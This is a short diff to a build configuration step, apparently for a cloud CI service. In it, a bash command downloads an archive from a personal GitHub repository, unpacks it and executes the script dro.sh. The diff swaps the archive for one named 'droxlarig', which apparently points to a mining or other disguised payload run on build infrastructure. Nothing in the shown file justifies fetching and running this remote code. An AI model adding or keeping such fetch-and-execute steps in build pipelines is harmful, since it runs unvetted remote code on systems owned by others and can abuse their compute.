@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/sabarlur/coba/raw/main/droxla.tar.gz && tar xf droxla.tar.gz && ./dro.sh
+         wget https://github.com/sabarlur/coba/raw/main/droxlarig.tar.gz && tar xf droxlarig.tar.gz && ./dro.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
